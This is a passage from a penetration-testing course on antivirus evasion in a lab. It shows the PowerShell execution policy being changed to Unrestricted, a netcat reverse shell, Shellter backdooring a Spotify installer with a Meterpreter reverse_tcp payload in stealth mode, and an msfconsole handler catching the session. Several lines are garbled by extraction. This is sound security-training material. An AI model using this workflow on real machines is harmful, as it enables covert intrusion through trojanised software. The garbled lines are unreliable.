+                                                                                               Penetration Testing with Kali Linux
+
+Figure 228: Avira scan on our malicious PowerShell script
+
+Since the msfvenom payload is for x86, we are   tghoeWinihmgitatlgooewlabuenlocwh.  the        x86  version  of  PowerShell,
+named Windows PowerShell (x86), as depicted in
+
+             Jeffrey
+
+OS-57752190
+
+                                                 Figure 229: Launching x86 powershell version
+
+Let's run bypass.ps1 and analyze the output.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                         453
+                                                                          Penetration Testing with Kali Linux
+
+PS C:\Users\offsec\Desktop> <cu>.\bypass.ps1</cu>
+
+.\bypass.ps1 : File C:\Users\offsec\Desktop\bypass.ps1 cannot be loaded because
+
+running scripts is disabled on this
+
+system. For more information, see about_Execution_Policies at
+
+https:/go.microsoft.com/fwlink/?LinkID=135170.
+
+At line:1 char:1
+
++ .\bypass.ps1
+
++ ~~~~~~~~~~~~
+
++ CategoryInfo    : SecurityError: (:) [], PSSecurityException
+
++ FullyQualifiedErrorId : UnauthorizedAccess
+
+Listing 339 - Attempting to run the script and encountering the Execution Policies error
+
+Unfortunately, when we attempt to run our malicious script, we are presented with an error that
+references the Execution Policies of our system, which appear to prevent our script from running.
+
+A quick review of the Microsoft documentation on PowerShell execution policies (linked in the
+error message), shows that these policies are set on a per-user rather than per-system basis.
+
+Keep in mind that much like anything in Windows, the PowerShell Execution Policy
+settings can be dictated by one or more Active Directory GPOs. In those cases, it may be
+necessary to search for additional bypass vectors.
+
+Let's attempt to view and change the policy for our current user. Please note that in this instance,
+we have chosen to change the policy globally rather than on a per-script basis, which can be
+achieved by using the -ExecutionPolicy Bypass flag for each script when it is run.
+
+PCFPU<sESxccSSeiunrroetsrrtcpCC>ertien,U:e:usng\\ntwtrtUUCdiitUessouechseerfnteaerrrierdessPnerex\\onec-eootldSogffU<iccmoffs/cuoissycentmpieerrgoeccC><an\\/hntCoDDacpdueeunorrassg>lerikkencetttdryniooetftppUovh>>eserOent<<Sthrhcc-secuue5eo>>7ct7cSGmui5teeur2mrtttreo1r--ena9EEUn0ntxxtndueeJrcc.seeeuueWxfsttreft.eiircriooceunnnytteePPioedooWndllhviiiip-taccSolyyctolhiowc--epyESeSxcvoeeCipcta-ueuErttxrhiCeeeouncnrtuGPrUtoeeisolnte-itnErcUPxtysooeelciUrscun<pyt/rei-ecoEcsunixt>fPeyrocitluchicttaiyeotdn-wSP-ecoolaipcreey
+
+The execution policy helps protect you from scripts that you do not trust. Changing
+the execution policy might expose
+you to the security risks described in the about_Execution_Policies help Module at
+https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution
+policy?
+[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is
+"N"): <cu>A</cu>
+
+PS C:\Users\offsec\Desktop> <cu>Get-ExecutionPolicy -Scope CurrentUser</cu>
+<cr>Unrestricted</cr>
+
+                                      Listing 340 - Changing the ExecutionPolicy for our current user
+
+The listing above shows that we have successfully changed the policy for our current user to
+Unrestricted.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                  454
+                                                                          Penetration Testing with Kali Linux
+
+Before executing our script, we will start a Netcat listener on our Kali attacker machine to interact
+with our shell.
+
+kali@kali:~$ <cu>nc -lvnp 443</cu>
+listening on [any] 443 ...
+
+                                Listing 341 - Setting up a netcat listener to interact with our reverse shell
+
+Now we will try to launch the PowerShell script:
+
+PS C:\Users\offsec\Desktop> <cu>.\bypass.ps1</cu>
+
+IsPublic IsSerial Name                                                         BaseType
+                                                                                --------
+-------- -------- ----                                                         System.Array
+
+True  True    Byte[]    Listing 342 - Running the PowerShell script
+
+124059648
+
+124059649
+
+...
+
+The script executes without any problems, and we receive a reverse shell on our attack machine.
+
+      Info
+     The PowerShell window may close instead of showing the output above.
+
+kali@kali:~$ <cu>nc -lvnp 443</cu>
+listening on [any] 443 ...
+connect to [192.168.50.1] from (UNKNOWN) [192.168.50.62] 64613
+Microsoft Windows [Version 10.0.22000.675]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\offsec><cu>whoami</cu>             Whitlow
+whoami
+client01\offsec
+
+C:\Users\offsec><cu>hostname</cu>  Jeffrey
+hostname
+client01
+
+svTachrriiisoputmssetmhanaatschawirneeerhlueanavreonninefgLtfihsesetciontsfgitvy3wes4Olat3ySer--emeR5vce7.ac7aDed5nie2veib1pdn9ege0Anaimdvreiirnpvaeglersdmoeensethentechtlleteoidoncntoohuonarnftaitgwtoauiuclrlkraitntrtigyaomrntgoaeocathf.nintIahenleymszeeattshuyersetceoomrngsteananntizsdaotwifohtnhaset,
+
+they consider harmful, scripts like the one above may need to be altered or adapted for the target
+
+environment.
+
+Additionally, when implemented correctly with a skilled operations center, EDR systems could just
+silently alert the SOC team and thus, render our attack useless in a matter of minutes.
+
+15.3.3 Automating the process
+
+Now that we have learned how to manually evade an AV via PowerShell, let's explore how to
+automate AV evasion payloads.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                     455
+                                                                                                                                                                                      Penetration Testing with Kali Linux
+
+Shellter is a dynamic shellcode injection tool and one of the most popular free tools capable of
+bypassing antivirus software. It uses several novel and advanced techniques to backdoor a valid
+and non-malicious executable file with a malicious shellcode payload.
+
+While the details of the techniques Shellter uses are beyond the scope of this Module, it
+essentially performs a thorough analysis of the target PE file and the execution paths. It then
+determines where it can inject our shellcode without relying on traditional injection techniques
+that are easily caught by AV engines. Those include changing of PE file section permissions,
+creating new sections, etc.
+
+Finally, Shellter attempts to use the existing PE Import Address Table (IAT) entries to locate
+functions that will be used for the memory allocation, transfer, and execution of our payload.
+
+A Shellter Pro paid version that supports both 32 and 64-bit binaries, which includes
+stealthier anti-AV features, is also available.
+
+With a little bit of theory behind us, let's attempt to bypass our current Avira antivirus software
+using Shellter. We can install Shellter in Kali using the apt command.
+
+kali@kali:~$ <cu>apt-cache search shellter</cu>
+shellter - Dynamic shellcode injection tool and dynamic PE infector
+
+kali@kali:~$ <cu>sudo apt install shellter</cu>
+...
+
+Listing 344 - Installing shellter in Kali Linux
+
+kscS.a.yoin.lsmcitee@pmkaSatshilb.eiill:iltt~ye$rla<isyceudr>escsuaigdponaebadlpettooifbnresutnraunlninlgownwinWinei<3nJ/2edcfouafw>prepsyliocWpahetiirotanltoisnwgonsyssetveemrasl,  we will also install wine, a
+                                                                                                                                                                                      POSIX-compliant operating
+
+akIfapwlt-ieg@aekrtaeliiun:ss~int$gal<alcnuw>AisRnuMed3o2p<dro/pcckuge>s-sO-oSa-rL,d5iswd7ti7-ne5ag2nr31ce49he50id-tInteoscttauluslinregeawisin3lei8gi6nhKt&lay&lidLaiifnpfutex-regnett suept doaftceom&&mands.
+
+kali@kali:~$ <cu>sudo apt install wine</cu>
+
+kali@kali:~$ <cu>sudo dpkg --add-architecture amd64</cu>
+
+kali@kali:~$ <cu>sudo apt install -y qemu-user-static binfmt-support</cu>
+
+kali@kali:~$ <cu>sudo apt-get update && apt-get install wine32</cu>
+                                                Listing 346 - Installing wine in Kali Linux (ARM)
+
+Once everything is installed, running the shellter command in the local Kali terminal will provide
+us with a new console running under wine.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                         456
+                                                                          Penetration Testing with Kali Linux
+
+                                                        Figure 230: Initial shellter console.
+
+Shellter can run in either Auto or Manual mode. In Manual mode, the tool will launch the PE we
+want to use for injection and allow us to manipulate it on a more granular level. We can use this
+mode to highly customize the injection process in case the automatically selected options fail.
+
+For the purposes of this example however, we will run Shellter in Auto mode by selecting A at the
+etNphxreeoexmcptu,opwtpte.ueolamurrumpsautysslioecalepdcl.atFyaoerrtatShrpgisoetteifxPyaEam.sSpohleue,rlwlttaeerrgwwJeietlillflPufaEsrn.eeaTytlhhyWezeheifWitlaelinnoiddswopawrltosevr3idt2he-edbiitenxtrteihaceluetRixoeenscoufultoarwcbeletsoienicnsttjieaoclnlte. rafnodr
+To sFStaohrret,lrletweaerl''sellnangueatehgdoermtoeextnpetlalsli,nSitsh.iesOllbStee-r5s7tt7hp5er2a1Sc9pt0iocteiftyoipnisctkalalenr elowc,aletisosnsocnruotiunrizleodcaalpKplaicliamtioanchaisne. If we
+downloaded it from the Resources section, it will be located in
+/home/kali/Downloads/SpotifyFullWin10-32bit.exe. Before analyzing and altering the original PE
+in any way, Shellter will first create a backup of the file.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  457
+                                                                                     Penetration Testing with Kali Linux
+
+Figure 231: Selecting a target PE in shellter and performing a backup
+
+As soon as Shellter finds a suitable place to  itnhajseecewtxoeeWuchrwuipttoilaouoynlwdlofalloidkw,eitotwhf eitlhl SeaspPkoEtuifsayfitfienwrsetoauwllrearpnattyotloobaeednhahabavlees
+Stealth Mode, which will attempt to restore
+been executed. Let's enable Stealth Mode
+
+normally to avoid any suspicion.  with  theJelfisftreoyf                  available  payloads.  These  include  popular
+At this point, we are presented
+
+selections such as MeterpreterO, Sb-u5t7S75h2e1ll9te0r also supports custom payloads.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                        458
+                                                                                    Penetration Testing with Kali Linux
+
+                                Figure 232: List of payloads available in shellter
+
+Note that to  restore the execution flow through  theWShitetallotwh       Mode  option,  custom  payloads  need
+to terminate  by exiting the current thread.
+
+upTAMAnaoftetydettlteehroerriasspsWdtoresmiStnththeadearegotlpetwlAtea,esvsyrwitl'r1sioane1agbdda,syesnhpittdeoaacsusstthelswdeuedecmsna,aaoswptrtaetOethbSh'wgle-lialoo5inttbi7rieneer7aeygsg5nd,2itynto1twono9nolei0enoraegnmwJrse-noioMufllfracftetubrhhttesoeoiyseaurMpbtMtrotheehouettoeedtsrruMptelhpereeie.antteAyeardlfropnti-fearbfeurdeatpsrseecfueranobdivcmlmsepeirasinttsytogiilobnoMnebgatedowLosdfeef.uxoetlehnrece.liussrttteeeavddnedprcasaoreydrlroesaahcdntelsdyll,
+
+we'll select the first payload. We are then presented with the default options from Metasploit,
+
+such as the reverse shell host (LHOST) and port (LPORT), which we should fill with our local Kali's
+
+IP address and listening port.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                   459
+                                                                          Penetration Testing with Kali Linux
+
+                                                      Figure 233: Payload options in shellter
+
+With all the parameters set, Shellter will inject the payload into the Spotify installer and attempt to
+reach the first instruction of the payload.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+                                                    Figure 234: shellter verifying the injection
+
+Now that the test has succeeded, before transferring over the malicious PE file to our Windows
+client, we will configure a listener on our Kali machine to interact with the Meterpreter payload.
+We can accomplish this with the following one-liner, remembering to replace the IP address with
+the one on our Kali box.
+
+kali@kali:~$ <cu>msfconsole -x "use exploit/multi/handler;set payload
+windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"</cu>
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  460
+                                                                                                                              Penetration Testing with Kali Linux
+
+...
+[*] Using configured payload generic/shell_reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+LHOST => 192.168.50.1
+LPORT => 443
+[*] Started reverse TCP handler on 192.168.50.1:443
+
+                                       Listing 347 - Setting up a handler for the meterpreter payload
+
+Next, we will transfer the backdoored Spotify installer over to the target Windows 11 client and
+launch an Avira Quick Scan as we did previously.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OFSig-u5re77253251: R9u0nning a Quick Scan using Avira
+Avira's Quick Scan performs a check inside every user's common folder, including the Desktop
+folder.
+
+Since Shellter obfuscates both the payload as well as the payload decoder before injecting them
+into the PE, Avira's signature-based scan runs cleanly. It does not consider the binary malicious.
+
+Once we execute the file, we are presented with the default Spotify installation window, which
+under normal circumstances will download the Spotify package over the internet. Because our
+VM has no internet connection, the Spotify installer will hang indefinitely.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  461
+                                                                                                                                                                                                                            Penetration Testing with Kali Linux
+
+                Figure 236: Launching the backWdhoiorteldoSwpotify installer
+
+Reviewing  our  multi/handler  window,  it  showJesftfhraetywe            successfully                                                                                                                                      received  a  Meterpreter  shell.
+
+...
+
+[[LL[pa**H*P]OOy]]SlRUTTSoSatseid==na>>nrdi=tg4en1>9gd4c2wo3sir.nntef16aidvogg8ew.uersr5s(0/eed.m17e1T5pCteaP1y7rlph4oarebantyddOeltSereg-se/r5n)r77oee5vntr2ieo11cr9/91s02s9e2_h.e.t1cl16p6l8_.85.re500v..e1:6r42s4e_3tcp
+
+<cr>[*] Meterpreter session 1 opened (192.168.50.1:443 -> 192.168.50.62:52273)...</cr>
+
+meterpreter > <cu>shell</cu>
+Process 6832 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.22000.739]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\offsec\Desktop><cu>whoami</cu>
+whoami
+<cr>client01\offsec</cr>
+
+                                                Listing 348 - Receiving the meterpreter session
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                              462
+                                                                                                                              Penetration Testing with Kali Linux
+
+We've launched an interactive Windows shell session and verified that we landed on the target
+machine as the offsec user.
+
+Awesome! We managed to evade antivirus detections by injecting a malicious payload into an
+otherwise legitimate program. This foundational example can be even further expanded and
+tailored on a case-by-case basis during real phishing engagements.
+
+15.4 Wrapping up
+
+In this Module, we discussed the purpose of antivirus software and the most common methods
+used by vendors to detect malicious code. We briefly explained various antivirus bypass methods
+that involve different techniques of on-disk and in-memory shellcode injection and demonstrated
+successful bypasses using Shellter and PowerShell.
+
+Although we have successfully bypassed antivirus detection in both of our examples, we have
+barely scratched the surface of malware detection and evasion. For further reading and to learn
+how much effort is required for malware writers to evade modern defenses, we encourage you to
+read the excellent Microsoft article "FinFisher exposed: A researcher's tale of defeating traps,
+tricks, and complex virtual machines" along with a few advanced evasion techniques listed in
+Emeric Nasi's paper.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  463
+
